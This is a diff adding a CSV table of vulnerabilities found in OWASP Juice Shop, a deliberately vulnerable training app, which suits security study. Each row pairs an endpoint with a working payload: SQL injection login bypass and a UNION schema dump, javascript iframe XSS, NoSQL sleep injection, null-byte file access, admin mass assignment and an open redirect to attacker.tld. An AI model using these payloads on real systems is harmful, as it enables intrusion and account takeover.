@@ -1,0 +1,24 @@
+Location (Endpoint),Vulnerability Type (OWASP Top 10 / OWASP API Top 10 ID),Payload,Vulnerability Description
+POST /rest/user/login,Injection (A03:2021) / Injection (API8:2019),"{"email":"admin@juice-sh.op'--","password":"x"}",SQL injection in login allows admin auth bypass via tautology/comment injection.
+POST /rest/user/login,Injection (A03:2021) / Injection (API8:2019),"{"email":"bender@juice-sh.op'--","password":"x"}",SQL injection to authenticate as specific user (Bender) by commenting out rest of query.
+GET /rest/basket/{id},Broken Access Control (A01:2021) / BOLA (API1:2019),,IDOR: changing basket ID reveals other users’ baskets (no ownership check).
+/#/administration (requires auth view),Broken Access Control (A01:2021) / Broken Function Level Authorization (API5:2019),,Admin page route discoverable/accessible once logged-in due to missing server-side authz enforcement.
+GET /ftp/acquisitions.md,Security Misconfiguration (A05:2021) / Improper Assets Management (API9:2019),,Publicly browsable ‘/ftp’ leaks internal docs (confidential acquisitions note).
+GET /ftp/package.json.bak%2500.md,Security Misconfiguration (A05:2021) / Improper Assets Management (API9:2019),%2500 (Poison Null Byte),Filter-bypass via poison null byte exposes backup package.json.bak.
+GET /ftp/coupons_2013.md.bak%2500.md,Security Misconfiguration (A05:2021) / Improper Assets Management (API9:2019),%2500 (Poison Null Byte),Same null-byte trick exposes sales backup data.
+GET /metrics,Security Misconfiguration (A05:2021) / Improper Assets Management (API9:2019),,Prometheus metrics endpoint exposed without auth, leaking operational data.
+GET /rest/user/whoami?callback=...,Security Misconfiguration (A05:2021) / Excessive Data Exposure (API3:2019),callback=anyFunction,JSONP-enabled whoami endpoint returns user data cross-domain (CORS/JSONP abuse).
+/#/search?q=...,XSS (A03:2021) / —,"<iframe src=""javascript:alert(`xss`)""">",DOM XSS via search field rendering unsanitized HTML/JS.
+GET /rest/track-order/{id},XSS (A03:2021) / —,"<iframe src=""javascript:alert(`xss`)""">",Reflected XSS by injecting payload into order tracking identifier path parameter.
+POST /rest/saveLoginIp (via logout),XSS (A03:2021) / —,"True-Client-IP: <iframe src=""javascript:alert(`xss`)""">",Persistent XSS via trusted header stored and later rendered in “Last Login IP”.
+POST /api/Feedbacks,Broken Access Control (A01:2021) / BOLA (API1:2019),"{"UserId":14,"captchaId":16,"captcha":"51","comment":"x","rating":2}",Forged feedback by tampering UserId to impersonate another user (no server-side ownership checks).
+POST /rest/products/1/reviews,Broken Access Control (A01:2021) / BOLA (API1:2019),"{"message":"great","author":"demo@demo.com"}",Forged review by setting author to another user; missing server-side attribution.
+POST /api/BasketItems,Injection + BAC (A03:2021 + A01:2021) / BOLA (API1:2019),"ProductId=22&BasketId=15&quantity=1&BasketId=13",HTTP Parameter Pollution + IDOR to insert items into another user’s basket.
+PUT /api/BasketItems/{id},Insecure Design (A04:2021) / —,"{""quantity"": -100}",Business logic flaw: negative quantity leads to credit/refund (“Payback Time”).
+POST /file-upload (complaints),Security Misconfiguration (A05:2021) / Improper Assets Management (API9:2019),XML file (e.g., invoice.xml),Deprecated B2B interface still accepts .xml uploads despite UI filter; leaked legacy surface.
+POST /api/Users (registration),Broken Access Control (A01:2021) / Mass Assignment (API6:2019),"{"email":"x","password":"x","role":"admin"}",Mass assignment of “role” elevates new user to admin.
+GET /rest/products/search?q=... (SQLi),Injection (A03:2021) / Injection (API8:2019),"')) UNION SELECT sql,'2','3','4','5','6','7','8','9' FROM sqlite_master--",SQL injection exfiltrates DB schema via UNION from sqlite_master.
+GET /rest/products/sleep(2000)/reviews,Injection (A03:2021) / Injection (API8:2019),sleep(2000),NoSQL/Mongo $where injection to induce server sleep (DoS-lite).
+GET /redirect?to=...,Security Misconfiguration (A05:2021) / Security Misconfiguration (API7:2019),"redirect?to=http://attacker.tld?pwned=https://github.com/bkimminich/juice-shop",Open redirect allowlist bypass by nesting a whitelisted URL as a parameter.
+Product page review (Apple Juice),Sensitive Data Exposure (legacy) -> Security Misconfiguration (A05:2021) / Improper Assets Management (API9:2019),,Admin email (admin@juice-sh.op) visible in public product review (unnecessary disclosure).
+/#/score-board,Security Misconfiguration (A05:2021) / Improper Assets Management (API9:2019),,Hidden functionality discoverable via client code; security-through-obscurity exposure of app state/hints.1
